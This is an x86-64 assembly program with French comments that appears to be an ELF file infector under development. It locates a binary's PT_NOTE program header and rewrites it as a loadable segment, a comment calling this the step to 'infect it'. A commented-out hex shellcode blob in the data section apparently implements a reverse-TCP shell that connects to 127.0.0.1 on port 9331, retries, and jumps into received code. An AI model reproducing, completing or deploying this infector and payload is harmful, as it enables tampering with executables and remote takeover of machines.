section .data
    msg_error db "Erreur !", 0xa
    msg_error_len equ $ - msg_error
    tp_load db 0x01

    offset_exagereted db 0x00,0x00 ,0xc0,0x00



  ;31 ff 6a 09 58 99 b6 10  48 89 d6 4d 31 c9 6a 22  
  ;41 5a 6a 07 5a 0f 05 48  85 c0 78 51 6a 0a 41 59  
  ;50 6a 29 58 99 6a 02 5f  6a 01 5e 0f 05 48 85 c0  
  ;78 3b 48 97 48 b9 02 00  24 73 7f 00 00 01 51 48  
  ;89 e6 6a 10 5a 6a 2a 58  0f 05 59 48 85 c0 79 25 
  ;49 ff c9 74 18 57 6a 23  58 6a 00 6a 05 48 89 e7  
  ;48 31 f6 0f 05 59 59 5f  48 85 c0 79 c7 6a 3c 58  
  ;6a 01 5f 0f 05 5e 6a 7e  5a 0f 05 48 85 c0 78 ed  
  ;ff e6                                             


section .bss
    buffer resb 2000      ; Buffer pour stocker les données lues
    file_name resq 40
    size_file_name resq 1

    file_descriptor resq 1

    offset_tp resq 1


section .text
    global _start

_start:


    pop rax
    cmp rax, 2 ;; nb d'elem
    jne error

    ; on retire le nom du fichier executable
    pop rsi

    ; recuperation de l'argument 1
    pop rax
    mov [file_name], rax

    ; Ouverture du fichier en lecture ecriture 
    mov rax, 2
    mov rdi, [file_name]
    mov rsi, 2
    syscall

    ; verification des erreurs
    test rax, rax 
    js error


    ; Sauvegarde du descripteur de fichier
    mov [file_descriptor], rax



    ; Lecture du fichier
    mov rax, 0          
    mov rdi, [file_descriptor]
    mov rsi, buffer     
    mov rdx, 2000        
    syscall            

    mov rdi, 1              ; file descriptor 1 is stdout
    mov rax, 1              
    mov rsi, buffer       ; affichage du fic debug  
    syscall 



    ;init
    xor r9, r9
    mov r9, buffer
    xor rcx, rcx



mov r15, buffer

parse_phdr:
  xor rcx, rcx                       ; zero out rcx
  xor rdx, rdx                       ; zero out rdx
  mov cx, 12     ;  phnum
  mov rbx, 64    ; rbx contains the offset of the PHT
  mov dx,  56 ; rdx contains the size of an entry in the PHT

  loop_phdr:
    add rbx, rdx                   ; for every iteration, add size of a PHT entry
    dec rcx                        ; decrease phnum until we've iterated through 
    xor r13, r13      
    mov r13d , dword [r15 +rbx] ; all program headers or found a PT_NOTE segment
    cmp dword [r15 +rbx], 0x4  ; if 4, we have found a PT_NOTE segment, ; and head off to infect it
    je pt_note_found
    cmp rcx, 0
    jg loop_phdr


    jmp error 
  pt_note_found:

    mov [offset_tp], rbx

;    mov [offset_tp], rcx
    
    xor rcx,rcx

    xor rax, rax

; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]     ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, tp_load   ; Nouvelles données à écrire
    mov rdx, 1 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   

    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 8   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, offset_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



sortie:



        ;fermeture du fichier
    mov rax, 3          
    mov rdi, [file_descriptor]       
    syscall  



    ; Code de sortie
    mov rax, 60    
    mov rdi, 0    
    syscall     


error:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_error
    mov rdx, msg_error_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall
